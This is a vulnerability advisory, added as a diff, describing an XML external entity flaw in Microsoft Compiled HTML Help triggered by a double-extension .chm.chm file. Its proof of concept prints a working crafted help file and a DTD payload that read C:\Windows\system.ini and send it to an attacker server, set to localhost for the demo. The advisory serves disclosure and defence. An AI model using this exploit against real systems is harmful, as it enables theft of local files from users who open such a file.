@@ -1,0 +1,105 @@
+[+] Credits: John Page (aka hyp3rlinx)		
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-HTML-HELP-UNCOMPILED-CHM-FILE-XML-EXTERNAL-ENTITY-INJECTION.txt
+[+] ISR: ApparitionSec          
+
+
+[Vendor]
+www.microsoft.com
+
+
+[Product]
+Microsoft Compiled HTML Help "hh.exe"
+
+Microsoft Compiled HTML Help is a Microsoft proprietary online help format, consisting of a collection of HTML pages, an index and other navigation tools.
+The files are compressed and deployed in a binary format with the extension .CHM, for Compiled HTML. The format is often used for software documentation.
+CHM is an extension for the Compiled HTML file format, most commonly used by Microsoft's HTML-based help program.
+
+
+[Vulnerability Type]
+Uncompiled .CHM File XML External Entity Injection
+
+
+[CVE Reference]
+N/A
+
+
+[Security Issue]
+CHM Files are usually created using Microsofts "HTML Help Workshop" program. However, I find a way to bypass using this program and create them easily by
+simply adding double .chm extension to the file ".chm.chm". Compiled HTML Help "hh.exe" will then respect and open it processing any JS/HTML/XML inside etc.
+Compiled HTML Help is also vulnerable to XML External Entity attacks allowing remote attackers to steal and exfiltrate local system files.
+
+Whats interesting about this one is we can create the file without using the "Microsoft HTML Help Workshop" program. Also, we can steal files without
+having to use the "hhtctrl.ocx" ActiveX control CLASSID: 52a2aaae-085d-4187-97ea-8c30db990436 or other code execution methods. 
+
+While CHM is already considered a "dangerous" file type and other type of attacks have already been documented. I thought this was an interesting way to
+create CHM files "Uncompiled" bypassing the default creation steps while stealing local files in the process.
+
+Note: User interaction is required to exploit this vulnerability.
+
+
+[Exploit/POC]
+1) python -m SimpleHTTPServer
+
+
+2) "XXE.chm.chm"
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<HTML>
+<HEAD>
+<Title>Uncompiled CHM File XXE PoC</Title>
+</HEAD>
+<BODY>
+<xml>
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE tastyexploits [ 
+<!ENTITY % file SYSTEM "C:\Windows\system.ini">
+<!ENTITY % dtd SYSTEM "http://localhost:81/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+</xml>
+</BODY>
+</HTML>
+
+
+3) "payload.dtd"  (hosted in python web-server dir port 81 above)
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:81?%file;'>">
+%all;
+
+
+Open the "XXE.chm.chm" file and will exfil Windows "system.ini", attacker Server IP is set to localhost using port 81 for PoC.
+
+Tested successfully Windows 7/10
+
+
+[POC Video URL]
+https://www.youtube.com/watch?v=iaxp1iBDWXY
+
+
+[Network Access]
+Remote
+
+
+
+[Severity]
+High
+
+
+[Disclosure Timeline]
+Vendor Notification: April 25, 2019
+MSRC Response: "We determined that this behavior is considered to be by design"
+July 16, 2019 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
